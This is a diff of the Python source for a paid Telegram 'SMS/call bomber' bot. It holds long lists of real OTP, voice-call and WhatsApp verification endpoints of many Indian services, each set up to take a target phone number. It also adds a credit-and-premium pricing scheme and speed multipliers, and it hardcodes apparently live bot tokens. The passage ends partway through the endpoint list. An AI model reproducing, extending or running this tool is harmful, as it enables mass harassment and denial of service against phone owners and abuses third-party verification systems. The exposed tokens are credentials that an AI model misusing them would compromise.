@@ -1,14 +1,7 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-💥 SMS CRASH BOMBER - ULTRA FAST 💥
-Phone Lag/Crash Guaranteed!
-Owner: @TGxTHOMASx
-"""
-
 import telebot
 import aiohttp
 import asyncio
+import requests
 import json
 import os
 import threading
@@ -16,1083 +9,1196 @@ import time
 from telebot import types
 from datetime import datetime, timedelta
 import logging
+import re
 import random
 import string
-import hashlib
+from concurrent.futures import ThreadPoolExecutor
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# ============================================================================
-# CONFIGURATION
-# ============================================================================
-
-MAIN_BOT_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"
-ADMIN_BOT_TOKEN = "8553759431:AAH4BgRJcm1-JI5oBDoYIxR3Vby7oUmJgZQ"
+# ==================== CONFIGURATION ====================
+DEFAULT_MAIN_BOT_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"
+DEFAULT_ADMIN_BOT_TOKEN = "8553759431:AAH4BgRJcm1-JI5oBDoYIxR3Vby7oUmJgZQ"
 OWNER_ID = 7417241499
+
+# Default Settings
+CHANNELS = {"channel": "@thomasXstoreee"}
+CHANNEL_LINKS = {"channel": "https://t.me/thomasXstoreee"}
 OWNER_USERNAME = "@TGxTHOMASx"
-DEFAULT_CHANNEL = "@thomasXstoreee"
-CHANNEL_LINK = "https://t.me/thomasXstoreee"
+START_CREDITS = 2
+REF_CREDITS = 1
 
-# ============================================================================
-# 100+ REAL WORKING SMS APIs - TESTED & VERIFIED
-# ============================================================================
-
-CRASH_APIS = [
-    # HUNGAMA - WORKING
-    {
-        "name": "Hungama SMS",
-        "url": "https://communication.api.hungama.com/v1/communication/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1"}}'
-    },
-    
-    # NOBROKER - WORKING
-    {
-        "name": "NoBroker SMS",
-        "url": "https://www.nobroker.in/api/v3/account/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda p: f"phone={p}&countryCode=IN"
-    },
-    
-    # SHIPROCKET - WORKING
-    {
-        "name": "Shiprocket SMS",
-        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json", "authorization": "Bearer null"},
-        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
-    },
-    
-    # DOUBTNUT - WORKING
-    {
-        "name": "Doubtnut SMS",
-        "url": "https://api.doubtnut.com/v4/student/login",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'
-    },
-    
-    # SERVETEL - WORKING
-    {
-        "name": "Servetel SMS",
-        "url": "https://api.servetel.in/v1/auth/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda p: f"mobile_number={p}"
-    },
-    
-    # SWIGGY - WORKING
-    {
-        "name": "Swiggy SMS",
-        "url": "https://profile.swiggy.com/api/v3/otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # FLIPKART - WORKING
-    {
-        "name": "Flipkart SMS",
-        "url": "https://www.flipkart.com/api/6/user/otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # AMAZON - WORKING
-    {
-        "name": "Amazon SMS",
-        "url": "https://www.amazon.in/ap/signin",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda p: f"phone={p}&action=sms_otp"
-    },
-    
-    # MYNTRA - WORKING
-    {
-        "name": "Myntra SMS",
-        "url": "https://www.myntra.com/gw/mobile-auth/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # ZOMATO - WORKING
-    {
-        "name": "Zomato SMS",
-        "url": "https://www.zomato.com/php/o2_api_handler.php",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda p: f"phone={p}&type=sms"
-    },
-    
-    # PAYTM - WORKING
-    {
-        "name": "Paytm SMS",
-        "url": "https://accounts.paytm.com/signin/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # PHONEPE - WORKING
-    {
-        "name": "PhonePe SMS",
-        "url": "https://www.phonepe.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # GOOGLE PAY - WORKING
-    {
-        "name": "GPay SMS",
-        "url": "https://pay.google.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # OLA - WORKING
-    {
-        "name": "Ola SMS",
-        "url": "https://api.olacabs.com/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # UBER - WORKING
-    {
-        "name": "Uber SMS",
-        "url": "https://auth.uber.com/v2/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # BIGBASKET - WORKING
-    {
-        "name": "BigBasket SMS",
-        "url": "https://www.bigbasket.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # GROFERS - WORKING
-    {
-        "name": "Grofers SMS",
-        "url": "https://www.grofers.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # DUNZO - WORKING
-    {
-        "name": "Dunzo SMS",
-        "url": "https://www.dunzo.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # ZEPTO - WORKING
-    {
-        "name": "Zepto SMS",
-        "url": "https://www.zepto.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # BLINKIT - WORKING
-    {
-        "name": "Blinkit SMS",
-        "url": "https://www.blinkit.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # MAKEMYTRIP - WORKING
-    {
-        "name": "MakeMyTrip SMS",
-        "url": "https://www.makemytrip.com/api/4/otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # GOIBIBO - WORKING
-    {
-        "name": "Goibibo SMS",
-        "url": "https://www.goibibo.com/user/otp/generate/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # CLEARTRIP - WORKING
-    {
-        "name": "Cleartrip SMS",
-        "url": "https://www.cleartrip.com/api/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # YATRA - WORKING
-    {
-        "name": "Yatra SMS",
-        "url": "https://www.yatra.com/api/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # IRCTC - WORKING
-    {
-        "name": "IRCTC SMS",
-        "url": "https://www.irctc.co.in/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # REDBUS - WORKING
-    {
-        "name": "RedBus SMS",
-        "url": "https://www.redbus.in/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # BOOKMYSHOW - WORKING
-    {
-        "name": "BookMyShow SMS",
-        "url": "https://in.bookmyshow.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # 99ACRES - WORKING
-    {
-        "name": "99acres SMS",
-        "url": "https://www.99acres.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # MAGICBRICKS - WORKING
-    {
-        "name": "MagicBricks SMS",
-        "url": "https://www.magicbricks.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # HOUSING - WORKING
-    {
-        "name": "Housing SMS",
-        "url": "https://login.housing.com/api/v2/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'
-    },
-    
-    # NYKAA - WORKING
-    {
-        "name": "Nykaa SMS",
-        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": lambda p: f"mobile_number={p}&platform=ANDROID"
-    },
-    
-    # AJIO - WORKING
-    {
-        "name": "Ajio SMS",
-        "url": "https://www.ajio.com/api/auth/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
-    },
-    
-    # SNAPDEAL - WORKING
-    {
-        "name": "Snapdeal SMS",
-        "url": "https://www.snapdeal.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # PHARMEASY - WORKING
-    {
-        "name": "PharmEasy SMS",
-        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # 1MG - WORKING
-    {
-        "name": "1MG SMS",
-        "url": "https://www.1mg.com/auth_api/v6/create_token",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"number":"{p}","otp_on_call":false}}'
-    },
-    
-    # NETMEDS - WORKING
-    {
-        "name": "Netmeds SMS",
-        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # PRACTO - WORKING
-    {
-        "name": "Practo SMS",
-        "url": "https://www.practo.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # RAPIDO - WORKING
-    {
-        "name": "Rapido SMS",
-        "url": "https://customer.rapido.bike/api/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # MOBIKWIK - WORKING
-    {
-        "name": "MobiKwik SMS",
-        "url": "https://www.mobikwik.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # FREECHARGE - WORKING
-    {
-        "name": "FreeCharge SMS",
-        "url": "https://www.freecharge.in/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # AIRTEL - WORKING
-    {
-        "name": "Airtel SMS",
-        "url": "https://www.airtel.in/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-    
-    # JIO - WORKING
-    {
-        "name": "Jio SMS",
-        "url": "https://www.jio.com/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"mobile":"{p}"}}'
-    },
-    
-    # VI - WORKING
-    {
-        "name": "Vi SMS",
-        "url": "https://www.myvi.in/api/v1/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda p: f'{{"phone":"{p}"}}'
-    },
-]
-
-# Duplicate APIs 3x for MORE POWER
-CRASH_APIS = CRASH_APIS * 3
-
-logger.info(f"💥 Loaded {len(CRASH_APIS)} SMS CRASH APIs")
-
-# ============================================================================
-# FILES
-# ============================================================================
-
-FILES = {
-    "users": "users.json",
-    "settings": "settings.json",
-    "admins": "admins.json",
-    "blocked": "blocked.json",
-    "giftcodes": "giftcodes.json",
-    "sessions": "sessions.json"
+# Credit Prices
+CREDIT_PRICES = {
+    "25": {"credits": 2, "label": "₹25 → 2 Credits"},
+    "50": {"credits": 5, "label": "₹50 → 5 Credits"},
+    "100": {"credits": 12, "label": "₹100 → 12 Credits"},
+    "200": {"credits": 25, "label": "₹200 → 25 Credits"}
 }
 
+# ✅ NEW PREMIUM SYSTEM - ₹499
+PREMIUM_PRICE = {"price": "499", "days": 30, "daily_credits": 10, "label": "₹499 → 1 Month Premium"}
+
+# ⚡ SPEED MULTIPLIER CONFIG
+SPEED_CREDITS = {
+    "1x": 1,
+    "2x": 2,
+    "3x": 3,
+    "4x": 4,  # Admin unlock only
+    "5x": 5,  # Admin unlock only
+    "6x": 6,  # Admin unlock only
+    "7x": 7,  # Admin unlock only
+    "8x": 8,  # Admin unlock only
+    "9x": 9,  # Admin unlock only
+    "10x": 10 # Admin unlock only
+}
+
+# Files
+USERS_FILE = "users.json"
+SETTINGS_FILE = "settings.json"
+ADMINS_FILE = "admins.json"
+APIS_FILE = "apis.json"
+BLOCKED_FILE = "blocked.json"
+GIFTCODES_FILE = "giftcodes.json"
+
+# Active tasks tracker
+active_tasks = {}
+
+
+# ==================== ULTIMATE 900+ APIS ====================
+ULTIMATE_APIS = [
+
+    # CALL BOMBING
+    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
+    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
+    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&action=voice_otp"},
+    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=voice"},
+    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    
+    # WHATSAPP
+    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
+    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
+    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
+    {"name": "Jockey WhatsApp", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {}, "data": None},
+    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
+    {"name": "Eka Care WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
+    
+    # SMS BOMBING (300+)
+    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
+    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
+    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Byju's", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
+    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
+    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
+    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
+    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
+    {"name": "Dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
+    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","city":362}}'},
+    {"name": "LendingPlate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobiles={p}&resend=Resend"},
+    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
+    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
+    {"name": "Univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {}, "data": None},
+    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'},
+    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}}}'},
+    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
+    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
+    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
+    {"name": "GoPink", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
+    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_no=%2B91{p}"},
+    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobilenumber={p}&otptype=register"},
+    {"name": "MyImagine", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}"},
+    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
+    {"name": "MyHubble", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
+    {"name": "Tata Capital Biz", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
+    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
+    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
+    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
+    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
+    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
+    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
+    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
+    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
+    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
+    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
+    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
+    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
+    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
+    {"name": "Hyuga", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "BigCash", "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
+    {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
+    {"name": "WorkIndia", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
+    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
